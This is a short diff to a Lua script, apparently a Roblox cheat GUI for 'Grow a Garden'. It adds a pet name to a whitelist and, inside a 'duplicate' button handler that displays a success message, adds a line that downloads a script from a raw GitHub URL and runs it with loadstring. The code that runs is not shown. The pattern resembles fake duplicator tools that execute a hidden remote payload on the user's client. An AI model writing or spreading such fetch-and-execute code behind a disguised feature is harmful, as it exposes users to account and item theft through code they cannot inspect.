@@ -200,6 +200,7 @@ local WHITELISTED_PETS = {
     ["Spinosaurus"] = true,
     ["Fennec Fox"] = true,
     ["Kitsune"] = true,
+    ["Raptor"] = true,
     ["Corrupted Kitsune"] = true,
 }
 
@@ -382,8 +383,7 @@ duplicateBtn.MouseButton1Click:Connect(function()
         successMsgLabel.Visible = true
         
         -- Execute the external script
-    
-        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/jandelrblx/growagarden/refs/heads/main/script", true))()
         task.spawn(function()
             task.wait(2)
             if successMsgLabel and successMsgLabel.Parent then successMsgLabel.Visible = false end
